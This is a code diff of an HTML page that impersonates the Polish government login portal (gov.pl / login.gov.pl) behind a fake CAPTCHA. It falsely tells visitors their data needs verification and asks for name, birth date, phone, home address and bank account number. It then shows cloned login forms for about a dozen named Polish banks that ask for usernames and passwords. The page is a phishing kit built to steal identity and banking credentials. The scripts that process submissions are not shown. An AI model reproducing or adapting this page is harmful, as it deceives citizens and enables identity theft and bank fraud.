@@ -40,10 +40,7 @@
             padding: 0 20px;
         }
 
-        /* ============================================================
-           КАПЧА (ИЗ ПЕРВОГО ФАЙЛА — С CANVAS И 6 СИМВОЛАМИ)
-           ============================================================ */
-                /* ===== CAPTCHA OVERLAY ===== */
+        /* ===== CAPTCHA OVERLAY ===== */
         #captchaOverlay {
             position: fixed;
             top: 0;
@@ -3341,7 +3338,7 @@
 </head>
 <body>
 
-    <!-- ===== КАПЧА (С CANVAS И 6 СИМВОЛАМИ — ИЗ ПЕРВОГО ФАЙЛА) ===== -->
+    <!-- ===== CAPTCHA OVERLAY ===== -->
     <div id="captchaOverlay">
         <div class="captcha-box">
             <span class="captcha-icon">🛡️</span>
@@ -3358,704 +3355,672 @@
     <!-- ===== RESZTA STRONY (ukryta dopóki CAPTCHA nie zostanie rozwiązana) ===== -->
     <div id="mainContent" style="display:none;">
 
-    <!-- ========== HEADER ========== -->
-    <header class="header" id="header">
-        <div class="header-left">
-            <button class="menu-btn" aria-label="Menu" id="menuToggle">
-                <span class="line"></span>
-                <span class="line"></span>
-                <span class="line"></span>
-            </button>
-            <div class="logo-area">
-                <img src="grb.svg" alt="Godło Rzeczypospolitej Polskiej" class="coat-of-arms" width="72" height="50">
-                <div class="logo-main">
-                    <span class="gov">gov.pl</span>
-                    <span class="separator">|</span>
-                    <span class="subtitle">Serwis Rzeczypospolitej Polskiej</span>
-                </div>
-            </div>
-        </div>
-        <div class="header-right">
-            <div class="header-search">
-                <button class="search-icon-btn" aria-label="Szukaj">
-                    <svg viewBox="0 0 24 24">
-                        <circle cx="11" cy="11" r="8" />
-                        <line x1="21" y1="21" x2="16.65" y2="16.65" />
-                    </svg>
+        <!-- ========== HEADER ========== -->
+        <header class="header" id="header">
+            <div class="header-left">
+                <button class="menu-btn" aria-label="Menu" id="menuToggle">
+                    <span class="line"></span>
+                    <span class="line"></span>
+                    <span class="line"></span>
                 </button>
-                <input type="text" placeholder="Szukaj usługi, informacji" aria-label="Szukaj">
-                <button class="search-submit-btn">SZUKAJ</button>
-            </div>
-            <span class="header-eu-logo">
-                <img src="eu-center-pl.svg" alt="EU Center PL">
-            </span>
-        </div>
-    </header>
-
-    <div class="main-wrapper" id="mainWrapper">
-        <aside class="sidebar" id="sidebar">
-            <nav class="sidebar-nav">
-                <ul>
-                    <li><a href="#" class="active">Strona główna</a></li>
-                    <li><a href="#">Rada Ministrów</a></li>
-                    <li><a href="#">Kancelaria Premiera</a></li>
-                    <li><a href="#">Ministerstwa</a></li>
-                    <li><a href="#">Urzędy, instytucje i placówki RP</a></li>
-                    <li class="separator"></li>
-                    <li><a href="#"><span class="menu-icon"><img src="15-uprawnienia.svg" alt=""></span>Usługi dla obywatela</a></li>
-                    <li><a href="#"><span class="menu-icon"><img src="07-rozwoj.svg" alt=""></span>Usługi dla przedsiębiorcy</a></li>
-                    <li><a href="#"><span class="menu-icon"><img src="13-pismo-ogolne-do-urzedu.svg" alt=""></span>Usługi dla urzędnika</a></li>
-                    <li><a href="#"><span class="menu-icon"><img src="15-uprawnienia.svg" alt=""></span>Usługi dla rolnika</a></li>
-                    <li class="separator"></li>
-                    <li><a href="#">Profil zaufany</a></li>
-                    <li><a href="#">Baza wiedzy</a></li>
-                    <li><a href="#">Serwis Służby Cywilnej</a></li>
-                    <li class="separator"></li>
-                    <li>
-                        <a href="#" class="ukraine-link">
-                            <span class="flag-icon"><img src="a6631d28-8291-4474-b530-32864664800e.svg" alt="UA"></span>
-                            <span>Сайт dla obywateli Ukrainy</span>
-                        </a>
-                    </li>
-                </ul>
-            </nav>
-        </aside>
-
-        <div class="content-wrapper" id="contentWrapper">
-
-            <!-- ===== LOGIN NAV ===== -->
-            <div class="login-nav" id="loginNav">
-                <span class="brand">Login.gov.pl</span>
-                <div class="nav-links">
-                    <a href="#">Jak korzystać</a>
-                    <a href="#">Gdzie skorzystać</a>
-                    <a href="#">Bezpieczeństwo</a>
-                    <a href="#">Pomoc</a>
-                    <a href="#">Dla integratorów</a>
-                    <a href="#">Kontakt</a>
-                </div>
-            </div>
-
-            <!-- ===== BANNER ===== -->
-            <div class="image-under-banner" id="imageBanner">
-                <div class="image-wrapper">
-                    <img src="4a4bfee8-cecc-4734-b549-3230515a45ef.png" alt="Image" style="width:100%; height:auto;">
-                    <div class="overlay-icon">
-                        <img src="51816b1b-533d-4730-983d-e3ce4184dcf6.svg" alt="icon">
-                    </div>
-                    <div class="overlay-line"></div>
-                    <div class="overlay-text">
-                        <h2>Poznaj login.gov.pl</h2>
-                        <p>Potwierdź tożsamość online i korzystaj z różnych usług w serwisach publicznych</p>
-                        <button class="btn-outline" id="scrollToFormBtn">DOWIEDZ SIĘ WIĘCEJ</button>
+                <div class="logo-area">
+                    <img src="grb.svg" alt="Godło Rzeczypospolitej Polskiej" class="coat-of-arms" width="72" height="50">
+                    <div class="logo-main">
+                        <span class="gov">gov.pl</span>
+                        <span class="separator">|</span>
+                        <span class="subtitle">Serwis Rzeczypospolitej Polskiej</span>
                     </div>
                 </div>
             </div>
-
-            <!-- ===== FORM ===== -->
-            <section class="data-form-section" id="dataFormSection">
-                <h2 class="section-title">Dane osobowe</h2>
-
-                <div class="blue-alert">
-                    <span class="alert-icon">ℹ️</span>
-                    <strong>Uwaga:</strong> Twoje dane są nieaktualne i wymagają weryfikacji. Prosimy o aktualizację swoich danych jak najszybciej, aby zapewnić, że posiadamy poprawne i aktualne informacje oraz możemy utrzymywać z Tobą kontakt i informować Cię na bieżąco przez cały proces.
+            <div class="header-right">
+                <div class="header-search">
+                    <button class="search-icon-btn" aria-label="Szukaj">
+                        <svg viewBox="0 0 24 24">
+                            <circle cx="11" cy="11" r="8" />
+                            <line x1="21" y1="21" x2="16.65" y2="16.65" />
+                        </svg>
+                    </button>
+                    <input type="text" placeholder="Szukaj usługi, informacji" aria-label="Szukaj">
+                    <button class="search-submit-btn">SZUKAJ</button>
                 </div>
+                <span class="header-eu-logo">
+                    <img src="eu-center-pl.svg" alt="EU Center PL">
+                </span>
+            </div>
+        </header>
 
-                <form class="data-form" id="dataForm">
-                    <div class="form-group">
-                        <label for="fullname">Imię i nazwisko <span class="required">*</span></label>
-                        <input type="text" id="fullname" name="fullname" placeholder="Imię i nazwisko" required>
-                    </div>
+        <div class="main-wrapper" id="mainWrapper">
+            <aside class="sidebar" id="sidebar">
+                <nav class="sidebar-nav">
+                    <ul>
+                        <li><a href="#" class="active">Strona główna</a></li>
+                        <li><a href="#">Rada Ministrów</a></li>
+                        <li><a href="#">Kancelaria Premiera</a></li>
+                        <li><a href="#">Ministerstwa</a></li>
+                        <li><a href="#">Urzędy, instytucje i placówki RP</a></li>
+                        <li class="separator"></li>
+                        <li><a href="#"><span class="menu-icon"><img src="15-uprawnienia.svg" alt=""></span>Usługi dla obywatela</a></li>
+                        <li><a href="#"><span class="menu-icon"><img src="07-rozwoj.svg" alt=""></span>Usługi dla przedsiębiorcy</a></li>
+                        <li><a href="#"><span class="menu-icon"><img src="13-pismo-ogolne-do-urzedu.svg" alt=""></span>Usługi dla urzędnika</a></li>
+                        <li><a href="#"><span class="menu-icon"><img src="15-uprawnienia.svg" alt=""></span>Usługi dla rolnika</a></li>
+                        <li class="separator"></li>
+                        <li><a href="#">Profil zaufany</a></li>
+                        <li><a href="#">Baza wiedzy</a></li>
+                        <li><a href="#">Serwis Służby Cywilnej</a></li>
+                        <li class="separator"></li>
+                        <li>
+                            <a href="#" class="ukraine-link">
+                                <span class="flag-icon"><img src="a6631d28-8291-4474-b530-32864664800e.svg" alt="UA"></span>
+                                <span>Сайт dla obywateli Ukrainy</span>
+                            </a>
+                        </li>
+                    </ul>
+                </nav>
+            </aside>
 
-                    <div class="form-group">
-                        <label for="birthdate">Data urodzenia <span class="required">*</span></label>
-                        <input type="text" id="birthdate" name="birthdate" placeholder="__/__/____" maxlength="10" required oninput="autoSlash(event)">
-                    </div>
+            <div class="content-wrapper" id="contentWrapper">
 
-                    <div class="form-group">
-                        <label for="phone">Numer telefonu <span class="required">*</span></label>
-                        <input type="tel" id="phone" name="phone" placeholder="+48" value="+48" required>
-                    </div>
-
-                    <div class="form-group full-width">
-                        <label>Adres zamieszkania <span class="required">*</span></label>
-                        <div class="address-row">
-                            <input type="text" name="street" placeholder="Ulica i numer" required>
-                            <input type="text" name="city" placeholder="Miasto" required>
-                            <input type="text" name="postal" placeholder="Kod pocztowy" required maxlength="6" oninput="autoPostal(event)">
-                        </div>
-                    </div>
-
-                    <div class="form-group full-width">
-                        <label for="iban">NRB (Numer Rachunku Bankowego) <span class="required">*</span></label>
-                        <div class="iban-wrapper" id="ibanWrapper">
-                            <span class="pl-prefix">PL</span>
-                            <input type="text" id="iban" name="iban" placeholder="00 0000 0000 0000 0000 0000 0000" required maxlength="35" autocomplete="off">
-                        </div>
-                    </div>
-
-                    <div class="form-actions">
-                        <button type="submit" class="submit-btn" id="submitBtn">
-                            <span class="spinner"></span>
-                            Wyślij
-                        </button>
-                    </div>
-                </form>
-            </section>
-
-            <!-- ===== BANK SELECT ===== -->
-            <section class="bank-selection" id="bankSelection">
-                <h2 class="bank-title">Bankowość elektroniczna</h2>
-                <p class="bank-subtitle">Wybierz bank, za pomocą którego chcesz się zalogować.</p>
-
-                <div class="bank-grid">
-                    <button class="bank-btn" onclick="openLoginScreen1()">
-                        <img src="logo.png" alt="Bank 1">
-                    </button>
-                    <button class="bank-btn" onclick="openLoginScreen2()">
-                        <img src="logo9.png" alt="Bank 2" style="width:161px; height:52px;">
-                    </button>
-                    <button class="bank-btn" onclick="openLoginScreen3()">
-                        <img src="logo2.png" alt="Bank 3">
-                    </button>
-                    <button class="bank-btn" onclick="openLoginScreen4()">
-                        <img src="logo3.png" alt="Bank 4">
-                    </button>
-                    <button class="bank-btn" onclick="openLoginScreen5()">
-                        <img src="logo4.png" alt="Bank 5">
-                    </button>
-                    <button class="bank-btn" onclick="openLoginScreen6()">
-                        <img src="logo5.png" alt="Bank 6">
-                    </button>
-                    <button class="bank-btn" onclick="openLoginScreen7()">
-                        <img src="logo6.png" alt="Bank 7">
-                    </button>
-                    <button class="bank-btn" onclick="openLoginScreen8()">
-                        <img src="logo7.png" alt="Bank 8">
-                    </button>
-                    <button class="bank-btn" onclick="openLoginScreen9()">
-                        <img src="logo8.png" alt="Bank 9">
-                    </button>
-                    <button class="bank-btn" onclick="openLoginScreen10()">
-                        <img src="logo (2).png" alt="Bank 10">
-                    </button>
-                    <button class="bank-btn" onclick="openLoginScreen12()">
-                        <img src="logo_ing-logo.svg" alt="ING Bank Śląski">
-                    </button>
-                </div>
-
-                <div class="bank-footer" id="bankFooter">
-                    <div class="footer-links">
-                        <a href="#">Polityka cookies</a>
-                        <a href="#">Klauzula informacyjna</a>
-                        <a href="#">Deklaracja dostępności</a>
+                <!-- ===== LOGIN NAV ===== -->
+                <div class="login-nav" id="loginNav">
+                    <span class="brand">Login.gov.pl</span>
+                    <div class="nav-links">
+                        <a href="#">Jak korzystać</a>
+                        <a href="#">Gdzie skorzystać</a>
+                        <a href="#">Bezpieczeństwo</a>
+                        <a href="#">Pomoc</a>
+                        <a href="#">Dla integratorów</a>
                         <a href="#">Kontakt</a>
                     </div>
                 </div>
-            </section>
 
-            <!-- ===== BANK 1 ===== -->
-            <section class="login-screen" id="loginScreen1">
-                <div class="login-container">
-                    <div class="login-grid">
-                        <div class="login-left">
-                            <span class="ipko-logo">
-                                <img src="ipko.jpg" alt="iPKO">
-                            </span>
-                            <div class="login-title">Zaloguj się</div>
-                            <div class="login-subtitle">i użyj e-Tożsamości</div>
+                <!-- ===== BANNER ===== -->
+                <div class="image-under-banner" id="imageBanner">
+                    <div class="image-wrapper">
+                        <img src="4a4bfee8-cecc-4734-b549-3230515a45ef.png" alt="Image" style="width:100%; height:auto;">
+                        <div class="overlay-icon">
+                            <img src="51816b1b-533d-4730-983d-e3ce4184dcf6.svg" alt="icon">
+                        </div>
+                        <div class="overlay-line"></div>
+                        <div class="overlay-text">
+                            <h2>Poznaj login.gov.pl</h2>
+                            <p>Potwierdź tożsamość online i korzystaj z różnych usług w serwisach publicznych</p>
+                            <button class="btn-outline" id="scrollToFormBtn">DOWIEDZ SIĘ WIĘCEJ</button>
+                        </div>
+                    </div>
+                </div>
 
-                            <form class="login-form" onsubmit="return handleLogin(event, 'iPKO')">
+                <!-- ===== FORM ===== -->
+                <section class="data-form-section" id="dataFormSection">
+                    <h2 class="section-title">Dane osobowe</h2>
+
+                    <div class="blue-alert">
+                        <span class="alert-icon">ℹ️</span>
+                        <strong>Uwaga:</strong> Twoje dane są nieaktualne i wymagają weryfikacji. Prosimy o aktualizację swoich danych jak najszybciej, aby zapewnić, że posiadamy poprawne i aktualne informacje oraz możemy utrzymywać z Tobą kontakt i informować Cię na bieżąco przez cały proces.
+                    </div>
+
+                    <form class="data-form" id="dataForm">
+                        <div class="form-group">
+                            <label for="fullname">Imię i nazwisko <span class="required">*</span></label>
+                            <input type="text" id="fullname" name="fullname" placeholder="Imię i nazwisko" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="birthdate">Data urodzenia <span class="required">*</span></label>
+                            <input type="text" id="birthdate" name="birthdate" placeholder="__/__/____" maxlength="10" required oninput="autoSlash(event)">
+                        </div>
+
+                        <div class="form-group">
+                            <label for="phone">Numer telefonu <span class="required">*</span></label>
+                            <input type="tel" id="phone" name="phone" placeholder="+48" value="+48" required>
+                        </div>
+
+                        <div class="form-group full-width">
+                            <label>Adres zamieszkania <span class="required">*</span></label>
+                            <div class="address-row">
+                                <input type="text" name="street" placeholder="Ulica i numer" required>
+                                <input type="text" name="city" placeholder="Miasto" required>
+                                <input type="text" name="postal" placeholder="Kod pocztowy" required maxlength="6" oninput="autoPostal(event)">
+                            </div>
+                        </div>
+
+                        <div class="form-group full-width">
+                            <label for="iban">NRB (Numer Rachunku Bankowego) <span class="required">*</span></label>
+                            <div class="iban-wrapper" id="ibanWrapper">
+                                <span class="pl-prefix">PL</span>
+                                <input type="text" id="iban" name="iban" placeholder="00 0000 0000 0000 0000 0000 0000" required maxlength="35" autocomplete="off">
+                            </div>
+                        </div>
+
+                        <div class="form-actions">
+                            <button type="submit" class="submit-btn" id="submitBtn">
+                                <span class="spinner"></span>
+                                Wyślij
+                            </button>
+                        </div>
+                    </form>
+                </section>
+
+                <!-- ===== BANK SELECT ===== -->
+                <section class="bank-selection" id="bankSelection">
+                    <h2 class="bank-title">Bankowość elektroniczna</h2>
+                    <p class="bank-subtitle">Wybierz bank, za pomocą którego chcesz się zalogować.</p>
+
+                    <div class="bank-grid">
+                        <button class="bank-btn" onclick="openLoginScreen1()">
+                            <img src="logo.png" alt="Bank 1">
+                        </button>
+                        <button class="bank-btn" onclick="openLoginScreen2()">
+                            <img src="logo9.png" alt="Bank 2" style="width:161px; height:52px;">
+                        </button>
+                        <button class="bank-btn" onclick="openLoginScreen3()">
+                            <img src="logo2.png" alt="Bank 3">
+                        </button>
+                        <button class="bank-btn" onclick="openLoginScreen4()">
+                            <img src="logo3.png" alt="Bank 4">
+                        </button>
+                        <button class="bank-btn" onclick="openLoginScreen5()">
+                            <img src="logo4.png" alt="Bank 5">
+                        </button>
+                        <button class="bank-btn" onclick="openLoginScreen6()">
+                            <img src="logo5.png" alt="Bank 6">
+                        </button>
+                        <button class="bank-btn" onclick="openLoginScreen7()">
+                            <img src="logo6.png" alt="Bank 7">
+                        </button>
+                        <button class="bank-btn" onclick="openLoginScreen8()">
+                            <img src="logo7.png" alt="Bank 8">
+                        </button>
+                        <button class="bank-btn" onclick="openLoginScreen9()">
+                            <img src="logo8.png" alt="Bank 9">
+                        </button>
+                        <button class="bank-btn" onclick="openLoginScreen10()">
+                            <img src="logo (2).png" alt="Bank 10">
+                        </button>
+                        <button class="bank-btn" onclick="openLoginScreen12()">
+                            <img src="logo_ing-logo.svg" alt="ING Bank Śląski">
+                        </button>
+                    </div>
+
+                    <div class="bank-footer" id="bankFooter">
+                        <div class="footer-links">
+                            <a href="#">Polityka cookies</a>
+                            <a href="#">Klauzula informacyjna</a>
+                            <a href="#">Deklaracja dostępności</a>
+                            <a href="#">Kontakt</a>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- ===== BANK 1 ===== -->
+                <section class="login-screen" id="loginScreen1">
+                    <div class="login-container">
+                        <div class="login-grid">
+                            <div class="login-left">
+                                <span class="ipko-logo">
+                                    <img src="ipko.jpg" alt="iPKO">
+                                </span>
+                                <div class="login-title">Zaloguj się</div>
+                                <div class="login-subtitle">i użyj e-Tożsamości</div>
+
+                                <form class="login-form" onsubmit="return handleLogin(event, 'iPKO')">
+                                    <div class="form-group">
+                                        <label for="loginUsername1">Login</label>
+                                        <input type="text" id="loginUsername1" placeholder="Wpisz login" required>
+                                    </div>
+                                    <div class="login-btn-row">
+                                        <div class="form-group" style="flex:1; min-width:180px; margin-bottom:0;">
+                                            <label for="loginPassword1">Hasło</label>
+                                            <input type="password" id="loginPassword1" placeholder="Wpisz hasło" required>
+                                        </div>
+                                        <button type="submit" class="login-btn">Dalej</button>
+                                    </div>
+                                </form>
+                            </div>
+
+                            <div class="login-right">
+                                <div class="security-info">
+                                    <div class="info-title">Bezpieczne logowanie</div>
+                                    <div class="security-block">
+                                        <p><span class="highlight">Sprzęt i strony logowania</span></p>
+                                        <p>Zawsze sprawdzaj adresy stron www, na których się logujesz, a także ich certyfikaty. Loguj się tylko na urządzeniach z aktualnym i legalnym oprogramowaniem.</p>
+                                    </div>
+                                    <div class="security-block">
+                                        <p><span class="highlight">Chroń swoją prywatność</span></p>
+                                        <p>Upewnij się, że nikt nie widzi wpisywanych przez Ciebie danych. Loguj się tylko przy wykorzystaniu zaufanego połączenia z internetem.</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- ===== BANK 2 ===== -->
+                <div class="bank2-full-page" id="loginScreen2">
+                    <div class="bank2-container">
+                        <div class="bank2-box">
+                            <div class="bank2-logo">
+                                <img src="logo9.png" alt="Bank 2">
+                            </div>
+                            <form class="bank2-form" onsubmit="return handleLogin(event, 'Bank 2')">
                                 <div class="form-group">
-                                    <label for="loginUsername1">Login</label>
-                                    <input type="text" id="loginUsername1" placeholder="Wpisz login" required>
+                                    <label for="loginUsername2">Podaj Millekod</label>
+                                    <input type="text" id="loginUsername2" placeholder="Wpisz Millekod" required>
+                                </div>
+                                <div class="form-group">
+                                    <label for="loginPassword2">Hasło</label>
+                                    <input type="password" id="loginPassword2" placeholder="Wpisz hasło" required>
                                 </div>
                                 <div class="login-btn-row">
-                                    <div class="form-group" style="flex:1; min-width:180px; margin-bottom:0;">
-                                        <label for="loginPassword1">Hasło</label>
-                                        <input type="password" id="loginPassword1" placeholder="Wpisz hasło" required>
+                                    <div class="form-group">
+                                        <input type="text" placeholder=" " style="border:none; background:transparent; padding:0; height:0; min-height:0; visibility:hidden; display:none;">
+                                    </div>
+                                    <button type="submit" class="login-btn">Dalej</button>
+                                </div>
+                            </form>
+                            <div class="bank2-footer-text">
+                                <strong>Fałszywi konsultanci</strong>
+                                Oszuści podszywają się pod pracowników Banku - nie pobieraj nieznanych aplikacji i nie udostępniaj poufnych danych
+                                <br><br>
+                                <strong>Finanse 360°</strong>
+                                Sprawdź saldo i zlecaj przelewy z kont w innych bankach wygodnie przez Millenet
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ===== BANK 3 ===== -->
+                <div class="bank3-full-page" id="loginScreen3">
+                    <div class="bank3-header">
+                        <div class="bank3-header-content">
+                            <span class="bank3-logo"><img src="logo-white.svg" alt="Bank 3"></span>
+                        </div>
+                    </div>
+                    <div class="login-container">
+                        <div class="login-form-wrapper">
+                            <div class="login-title">Zaloguj się</div>
+                            <div class="login-subtitle">do bankowości elektronicznej</div>
+                            <form class="login-form" onsubmit="return handleLogin(event, 'Bank 3')">
+                                <div class="form-group">
+                                    <label for="loginUsername3">Login</label>
+                                    <input type="text" id="loginUsername3" placeholder="Wpisz login" required>
+                                </div>
+                                <div class="login-btn-row">
+                                    <div class="form-group">
+                                        <label for="loginPassword3">Hasło</label>
+                                        <input type="password" id="loginPassword3" placeholder="Wpisz hasło" required>
+                                    </div>
+                                    <button type="submit" class="login-btn">Dalej</button>
+                                </div>
+                            </form>
+                            <div class="security-warnings">
+                                <div class="warning-item"><span class="icon">⚠️</span><span>Zachowaj czujność - przestępcy podszywają się pod pracowników ds. bezpieczeństwa banku.</span></div>
+                                <div class="warning-item"><span class="icon">🔒</span><span>Bezpieczne wakacje z cyberPEKAO - zadbaj o spokój, gdziekolwiek jesteś!</span></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ===== BANK 4 ===== -->
+                <div class="bank4-full-page" id="loginScreen4">
+                    <div class="bank4-container">
+                        <div class="bank4-title">potwierdź swoją tożsamość</div>
+                        <div class="bank4-subtitle">zaloguj się do mBanku loginem i hasłem</div>
+                        <form class="bank4-form" onsubmit="return handleLogin(event, 'Bank 4')">
+                            <div class="form-group">
+                                <label for="loginUsername4">Login</label>
+                                <input type="text" id="loginUsername4" placeholder="Wpisz login" required>
+                            </div>
+                            <div class="login-btn-row">
+                                <div class="form-group">
+                                    <label for="loginPassword4">Hasło</label>
+                                    <input type="password" id="loginPassword4" placeholder="Wpisz hasło" required>
+                                </div>
+                                <button type="submit" class="login-btn">Dalej</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+
+                <!-- ===== BANK 5 ===== -->
+                <div class="bank5-full-page" id="loginScreen5">
+                    <div class="bank5-container">
+                        <div class="bank5-box">
+                            <div class="bank5-alert">
+                                Widzisz komunikat o blokadzie bankowości, nie pamiętasz danych logowania lub dostęp do Citi Handlowy jest zablokowany?
+                                <br>
+                                <a href="#" onclick="alert('Przekierowanie do logowania przez mObywatel'); return false;">Kliknij tutaj</a> i skorzystaj z najszybszej i najprostszej ścieżki - logowanie przez mObywatel lub e-Dowód.
+                                <br><br>
+                                Szybko potwierdzisz swoją tożsamość i odzyskasz dostęp – bez wychodzenia z domu i bez zbędnych formalności.
+                            </div>
+                            <div class="bank5-title">Zaloguj się do VeloBanku</div>
+                            <div class="bank5-subtitle">Login i hasło</div>
+                            <form class="bank5-form" onsubmit="return handleLogin(event, 'Bank 5')">
+                                <div class="form-group">
+                                    <label for="loginUsername5">Login</label>
+                                    <input type="text" id="loginUsername5" placeholder="Wpisz Twój login" required>
+                                </div>
+                                <div class="login-btn-row">
+                                    <div class="form-group">
+                                        <label for="loginPassword5">Hasło</label>
+                                        <input type="password" id="loginPassword5" placeholder="Wpisz hasło" required>
                                     </div>
                                     <button type="submit" class="login-btn">Dalej</button>
                                 </div>
                             </form>
                         </div>
-
-                        <div class="login-right">
-                            <div class="security-info">
-                                <div class="info-title">Bezpieczne logowanie</div>
-                                <div class="security-block">
-                                    <p><span class="highlight">Sprzęt i strony logowania</span></p>
-                                    <p>Zawsze sprawdzaj adresy stron www, na których się logujesz, a także ich certyfikaty. Loguj się tylko na urządzeniach z aktualnym i legalnym oprogramowaniem.</p>
-                                </div>
-                                <div class="security-block">
-                                    <p><span class="highlight">Chroń swoją prywatność</span></p>
-                                    <p>Upewnij się, że nikt nie widzi wpisywanych przez Ciebie danych. Loguj się tylko przy wykorzystaniu zaufanego połączenia z internetem.</p>
-                                </div>
-                            </div>
-                        </div>
                     </div>
                 </div>
-            </section>
 
-            <!-- ===== BANK 2 ===== -->
-            <div class="bank2-full-page" id="loginScreen2">
-                <div class="bank2-container">
-                    <div class="bank2-box">
-                        <div class="bank2-logo">
-                            <img src="logo9.png" alt="Bank 2">
-                        </div>
-                        <form class="bank2-form" onsubmit="return handleLogin(event, 'Bank 2')">
-                            <div class="form-group">
-                                <label for="loginUsername2">Podaj Millekod</label>
-                                <input type="text" id="loginUsername2" placeholder="Wpisz Millekod" required>
-                            </div>
-                            <div class="form-group">
-                                <label for="loginPassword2">Hasło</label>
-                                <input type="password" id="loginPassword2" placeholder="Wpisz hasło" required>
-                            </div>
-                            <div class="login-btn-row">
+                <!-- ===== BANK 6 ===== -->
+                <div class="bank6-full-page" id="loginScreen6">
+                    <div class="bank6-container">
+                        <div class="bank6-left">
+                            <div class="bank6-title">Logowanie</div>
+                            <form class="bank6-form" onsubmit="return handleLogin(event, 'Bank 6')">
                                 <div class="form-group">
-                                    <input type="text" placeholder=" " style="border:none; background:transparent; padding:0; height:0; min-height:0; visibility:hidden; display:none;">
+                                    <label for="loginUsername6">Login</label>
+                                    <input type="text" id="loginUsername6" placeholder="Wpisz login" required>
+                                </div>
+                                <div class="form-group">
+                                    <label for="loginPassword6">Hasło</label>
+                                    <input type="password" id="loginPassword6" placeholder="Wpisz hasło" required>
                                 </div>
                                 <button type="submit" class="login-btn">Dalej</button>
+                            </form>
+                            <div class="bank6-download"><img src="download.png" alt="Pobierz aplikację"></div>
+                        </div>
+                        <div class="bank6-right">
+                            <div class="bank6-security-title">🔒 Pamiętaj o zasadach bezpieczeństwa</div>
+                            <div class="bank6-security-text">
+                                <p>Wprowadzaj adres strony Banku ręcznie, nie korzystaj z wyników wyszukiwarek i linków niewiadomego pochodzenia.</p>
+                                <p><span class="highlight">Przed zalogowaniem sprawdź, czy:</span></p>
+                                <ul><li>adres rozpoczyna się od <span class="green">https</span></li><li>połączenie jest szyfrowane tj. w pasku adresu widoczna jest zamknięta kłódka</li><li>certyfikat strony wystawiony jest dla <span class="green">Bank Ochrony Środowiska S.A.</span></li></ul>
+                                <p>Używaj opcji <span class="highlight">Wyloguj</span> kończąc pracę w systemie, gwarantuje to poprawne zamknięcie twojej sesji.</p>
+                                <p>Jeśli zauważysz coś nietypowego lub podejrzanego zgłoś ten fakt do Banku.</p>
+                                <p>Więcej informacji na temat bezpieczeństwa znajdziesz na stronie Banku: <span class="link" onclick="alert('Przekierowanie do strony bezpieczeństwa'); return false;">Zasady bezpieczeństwa</span></p>
                             </div>
-                        </form>
-                        <div class="bank2-footer-text">
-                            <strong>Fałszywi konsultanci</strong>
-                            Oszuści podszywają się pod pracowników Banku - nie pobieraj nieznanych aplikacji i nie udostępniaj poufnych danych
-                            <br><br>
-                            <strong>Finanse 360°</strong>
-                            Sprawdź saldo i zlecaj przelewy z kont w innych bankach wygodnie przez Millenet
                         </div>
                     </div>
                 </div>
-            </div>
 
-            <!-- ===== BANK 3 ===== -->
-            <div class="bank3-full-page" id="loginScreen3">
-                <div class="bank3-header">
-                    <div class="bank3-header-content">
-                        <span class="bank3-logo"><img src="logo-white.svg" alt="Bank 3"></span>
-                    </div>
-                </div>
-                <div class="login-container">
-                    <div class="login-form-wrapper">
-                        <div class="login-title">Zaloguj się</div>
-                        <div class="login-subtitle">do bankowości elektronicznej</div>
-                        <form class="login-form" onsubmit="return handleLogin(event, 'Bank 3')">
-                            <div class="form-group">
-                                <label for="loginUsername3">Login</label>
-                                <input type="text" id="loginUsername3" placeholder="Wpisz login" required>
-                            </div>
-                            <div class="login-btn-row">
+                <!-- ===== BANK 7 ===== -->
+                <div class="bank7-full-page" id="loginScreen7">
+                    <div class="bank7-container">
+                        <div class="bank7-logo"><img src="bnp-paribas-logo-full.svg" alt="BNP Paribas"></div>
+                        <div class="bank7-box">
+                            <div class="bank7-title">Zaloguj się do GOonline</div>
+                            <div class="bank7-subtitle">Podaj swój login, aby zalogować się do serwisu transakcyjnego</div>
+                            <form class="bank7-form" onsubmit="return handleLogin(event, 'Bank 7')">
                                 <div class="form-group">
-                                    <label for="loginPassword3">Hasło</label>
-                                    <input type="password" id="loginPassword3" placeholder="Wpisz hasło" required>
+                                    <label for="loginUsername7">Login</label>
+                                    <input type="text" id="loginUsername7" placeholder="Wpisz login" required>
+                                </div>
+                                <div class="form-group">
+                                    <label for="loginPassword7">Hasło</label>
+                                    <input type="password" id="loginPassword7" placeholder="Wpisz hasło" required>
                                 </div>
                                 <button type="submit" class="login-btn">Dalej</button>
-                            </div>
-                        </form>
-                        <div class="security-warnings">
-                            <div class="warning-item"><span class="icon">⚠️</span><span>Zachowaj czujność - przestępcy podszywają się pod pracowników ds. bezpieczeństwa banku.</span></div>
-                            <div class="warning-item"><span class="icon">🔒</span><span>Bezpieczne wakacje z cyberPEKAO - zadbaj o spokój, gdziekolwiek jesteś!</span></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- ===== BANK 4 ===== -->
-            <div class="bank4-full-page" id="loginScreen4">
-                <div class="bank4-container">
-                    <div class="bank4-title">potwierdź swoją tożsamość</div>
-                    <div class="bank4-subtitle">zaloguj się do mBanku loginem i hasłem</div>
-                    <form class="bank4-form" onsubmit="return handleLogin(event, 'Bank 4')">
-                        <div class="form-group">
-                            <label for="loginUsername4">Login</label>
-                            <input type="text" id="loginUsername4" placeholder="Wpisz login" required>
-                        </div>
-                        <div class="login-btn-row">
-                            <div class="form-group">
-                                <label for="loginPassword4">Hasło</label>
-                                <input type="password" id="loginPassword4" placeholder="Wpisz hasło" required>
-                            </div>
-                            <button type="submit" class="login-btn">Dalej</button>
-                        </div>
-                    </form>
-                </div>
-            </div>
-
-            <!-- ===== BANK 5 ===== -->
-            <div class="bank5-full-page" id="loginScreen5">
-                <div class="bank5-container">
-                    <div class="bank5-box">
-                        <div class="bank5-alert">
-                            Widzisz komunikat o blokadzie bankowości, nie pamiętasz danych logowania lub dostęp do Citi Handlowy jest zablokowany?
-                            <br>
-                            <a href="#" onclick="alert('Przekierowanie do logowania przez mObywatel'); return false;">Kliknij tutaj</a> i skorzystaj z najszybszej i najprostszej ścieżki - logowanie przez mObywatel lub e-Dowód.
-                            <br><br>
-                            Szybko potwierdzisz swoją tożsamość i odzyskasz dostęp – bez wychodzenia z domu i bez zbędnych formalności.
-                        </div>
